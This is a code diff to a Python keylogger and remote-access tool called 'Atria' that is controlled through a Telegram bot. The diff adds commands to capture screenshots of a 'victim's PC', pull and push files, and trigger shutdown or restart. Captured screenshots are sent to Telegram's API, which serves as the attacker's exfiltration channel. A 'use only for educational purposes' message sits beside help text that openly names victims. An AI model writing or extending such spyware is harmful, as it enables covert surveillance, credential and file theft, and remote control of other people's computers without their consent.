@@ -1,3 +1,4 @@
+import io
 import os
 import sys
 import ctypes
@@ -14,8 +15,9 @@ import subprocess
 import requests
 import telebot
 import pyautogui
-from functools import wraps
+from PIL import Image
 from io import BytesIO
+from functools import wraps
 from PyQt6 import QtWidgets
 from PyQt6.QtWidgets import (
     QLabel,
@@ -73,7 +75,10 @@ def load_configuration():
         return None, None
 
 def start_message():
-    send_message("Keylogger started!")
+    send_message("Monitoring started!")
+    send_message("Thank you for using Atria!")
+    send_message("Use this script only for educational purposes!")
+    send_message("To list all commands, type /help in the chatbox.")
 
 # Telegram Bot
 bot_token, chat_id = load_configuration()
@@ -82,17 +87,50 @@ bot = telebot.TeleBot(bot_token) if bot_token and chat_id else None
 @retry_on_exception(requests.RequestException, retries=5, delay=2)
 def send_message(message):
     if bot:
-        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
-        payload = {'chat_id': chat_id, 'text': message}
-        requests.post(url, json=payload)
+        bot.send_message(chat_id, message)
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
-def send_photo(image):
+@bot.message_handler(commands=['help'])
+def send_help(message):
+    help_message = (
+        "Atria Commands\n"
+        "/help - List available commands\n"
+        "/screenshot - Capture and send a screenshot\n"
+        "/upload - Upload file from victim's PC\n"
+        "/download - Download file from victim's PC\n"
+        "/shutdown - Execute shutdown to the victim's PC\n"
+        "/restart - Execute restart to the victim's PC"
+    )
+    bot.send_message(message.chat.id, help_message)
+
+@bot.message_handler(commands=['screenshot'])
+def send_photo(message):
     if bot:
-        url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
-        files = {'photo': ('screenshot.png', image, 'image/png')}
-        payload = {'chat_id': chat_id}
-        requests.post(url, params=payload, files=files)
+        try:
+            # Capture screenshot
+            screenshot = pyautogui.screenshot()
+
+            # Save to a BytesIO object
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='PNG')
+            buffer.seek(0)
+
+            # Send screenshot
+            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
+            files = {'photo': ('screenshot.png', buffer, 'image/png')}
+            payload = {'chat_id': chat_id}
+            requests.post(url, params=payload, files=files)
+        except Exception as e:
+            log_message(f"Error in send_photo: {e}", 'error')
+
+@bot.message_handler(commands=['download'])
+def download_file(message):
+    file_id = message.document.file_id
+    file_info = bot.get_file(file_id)
+    file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
+    file_name = message.document.file_name
+    with open(file_name, 'wb') as f:
+        f.write(requests.get(file_url).content)
+    bot.send_message(chat_id, f"File downloaded: {file_name}")
 
 # Continuation of Keylogger Functions
 def get_app_dir():
@@ -193,7 +231,7 @@ class BotConfigGUI(QWidget):
         self.initUI()
 
     def initUI(self):
-        self.setWindowTitle('Telegram Bot Configuration')
+        self.setWindowTitle('Atria Configuration')
         self.setGeometry(100, 100, 300, 200)
 
         self.config = load_configuration()
@@ -265,6 +303,10 @@ if __name__ == '__main__':
         signal.signal(signal.SIGINT, finalize_session)
         atexit.register(finalize_session)
 
-        # Wait indefinitely
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            log_message(f"Error in bot polling: {e}", 'error')
+
         while True:
             time.sleep(1)
